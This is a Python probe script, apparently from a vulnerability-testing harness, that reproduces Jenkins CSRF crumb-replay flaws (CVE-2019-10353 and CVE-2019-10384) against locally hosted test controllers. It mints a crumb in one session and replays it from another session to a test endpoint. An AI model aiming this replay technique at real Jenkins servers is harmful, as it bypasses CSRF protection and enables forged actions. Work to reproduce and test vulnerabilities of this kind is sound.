#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]

Drives the REAL Jenkins controller over EXTERNAL HTTP. Never docker exec.
Seed = CVE-2019-10353 cross-session crumb replay.
Residual = CVE-2019-10384 sessionless crumb reuse.
"""
from __future__ import annotations

import http.cookiejar
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 30
HOSTPORT = {"v0": 39420, "v1": 39421, "v2": 39422}


def _target_base(version: str) -> str:
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    pt = os.environ.get("PCB_TARGET_PORT")
    if pt:
        return f"http://127.0.0.1:{int(pt)}"
    return f"http://127.0.0.1:{int(HOSTPORT[version])}"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class _Session:
    """Cookie-jar HTTP client so a crumb stays bound (or not) to JSESSIONID."""

    def __init__(self, version: str):
        self.base = _target_base(version)
        self.opener = urllib.request.build_opener(
            _NoRedirect(), urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
        )

    def req(self, path, *, method="GET", crumb=None, data=None, timeout=TIMEOUT):
        headers = {}
        if crumb:
            headers[crumb[0]] = crumb[1]
        body = data
        if isinstance(data, str):
            body = data.encode()
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        r = urllib.request.Request(self.base + path, data=body, method=method, headers=headers)
        try:
            with self.opener.open(r, timeout=timeout) as resp:
                return resp.status, resp.read(200000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            if e.code in (301, 302, 303, 307, 308):
                return e.code, ""
            return e.code, e.read(8000).decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return -1, f"HTTP_ERROR {type(e).__name__}: {e}"

    def crumb(self):
        st, body = self.req("/crumbIssuer/api/json")
        if st != 200:
            return None
        try:
            j = json.loads(body)
            return (j["crumbRequestField"], j["crumb"])
        except Exception:
            return None

    def create_web_session(self) -> bool:
        st, body = self.req("/pcbReveal/session")
        return st == 200 and "session=" in (body or "")


def run_probe(candidate, *, version="v1"):
    cand = candidate if isinstance(candidate, dict) else {}
    mode = cand.get("mode", "residual")
    a = _Session(version)
    b = _Session(version)

    if mode == "seed":
        if not a.create_web_session() or not b.create_web_session():
            return {
                "version": version,
                "mode": mode,
                "error": "session helper not ready",
                "http_status": -1,
                "body": "",
            }
        crumb = a.crumb()
        if not crumb:
            return {
                "version": version,
                "mode": mode,
                "error": "crumb mint failed",
                "http_status": -1,
                "body": "",
            }
        status, body = b.req(
            "/pcbReveal/reveal",
            method="POST",
            crumb=crumb,
            data={"action": "reveal"},
        )
    else:
        # residual: sessionless mint + replay (never hit /pcbReveal/session)
        crumb = a.crumb()
        if not crumb:
            return {
                "version": version,
                "mode": mode,
                "error": "crumb mint failed",
                "http_status": -1,
                "body": "",
            }
        status, body = b.req(
            "/pcbReveal/reveal",
            method="POST",
            crumb=crumb,
            data={"action": "reveal"},
        )

    return {
        "version": version,
        "probe_id": cand.get("probe_id"),
        "mode": mode,
        "http_status": status,
        "body": body,
    }


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
